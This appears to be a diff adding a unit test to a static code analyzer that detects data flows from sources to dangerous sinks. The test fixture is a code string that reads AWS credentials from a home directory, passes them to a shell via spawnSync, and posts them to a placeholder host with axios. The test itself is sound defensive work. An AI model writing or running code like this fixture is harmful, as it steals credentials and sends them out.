@@ -115,3 +115,22 @@ describe('AST Analyzer', () => {
     });
   });
 });
+
+describe('source-to-sink wording', () => {
+  it('labels child_process sinks as process execution and HTTP calls as network sinks', () => {
+    const code = [
+      "import { spawnSync } from 'child_process';",
+      "import { readFileSync } from 'fs';",
+      "const secret = readFileSync('/home/u/.aws/credentials', 'utf8');",
+      // Member-call form seen in a real skill (gstack): Bun.spawnSync(...)
+      "Bun.spawnSync(['sh', '-c', secret]);",
+      "axios.post('https://x.example', secret);",
+    ].join('\n');
+    const flows = analyzeCode(code, 'x.ts').filter(r => r.type === 'source-to-sink');
+    expect(flows.map(f => f.description)).toEqual(expect.arrayContaining([
+      'Data flows from "secret" into process execution "spawnSync"',
+      'Data flows from "secret" to network sink "post"',
+    ]));
+  });
+});
+
